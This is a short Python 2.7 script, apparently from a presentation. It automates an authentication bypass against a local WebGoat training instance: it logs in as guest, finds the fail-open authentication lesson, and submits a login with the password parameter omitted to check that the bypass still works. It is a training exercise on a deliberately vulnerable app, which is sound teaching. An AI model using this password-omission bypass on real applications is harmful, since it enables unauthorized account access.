#Python2.7
import requests
import argparse
import json
import re
import sys
# Example from presentation
def fail_open_authentication_scheme():
	#start session
	session = requests.Session()
	#Webgoat login page get
	host = '127.0.0.1'
	port = '8082'
	webgoat_main_address = 'http://' + host + ':' + port + '/WebGoat/'
	webgoat_session = session.get( webgoat_main_address +'login.mvc' )
	lesson_name = "Fail Open Authentication Scheme"

	try:
		#session token store
		cookie = webgoat_session.cookies

		login_parameters = {'username': 'guest', 'password': 'guest'}
		#login to access content
		login = session.post( webgoat_main_address + 'j_spring_security_check;jsessionid=' + str(cookie['JSESSIONID']), login_parameters )

		#access all lessons json and finding lesson api address by lesson name 
		#we could use direct link to lesson but thats just different approach
		webgoat_lesson_api = session.get( webgoat_main_address + 'service/lessonmenu.mvc' )
		webgoat_lesson_api_split = webgoat_lesson_api.text.split('},{')

		for i in webgoat_lesson_api_split:
			if lesson_name in i:
				lesson_api = i.split('\"link":\"')

		#prepare lesson address
		lesson_address = str( lesson_api[1].split( "\"" )[0] )
		lesson_parted_address = lesson_address[1:].split( '/' )
		lesson_prepared_api_address = lesson_parted_address[0] + '?Screen=' + lesson_parted_address[1] + '&menu=' + lesson_parted_address[2]

		#execute attack
		input_data = {'Username' : 'webgoat', 'SUBMIT': 'Login'}
		session.headers.update( {'Content-Type': 'application/x-www-form-urlencoded'} )
		end_result =  session.post(  webgoat_main_address + lesson_prepared_api_address, input_data )

		#validate
		if 'Welcome, webgoat' in end_result.text:
			print 'Success authentication vulnerability is still present'
		else:
			print 'Unfortunetaly it isn\'t working any more'

		#validation 
		
	except Exception as e:
		print e

fail_open_authentication_scheme()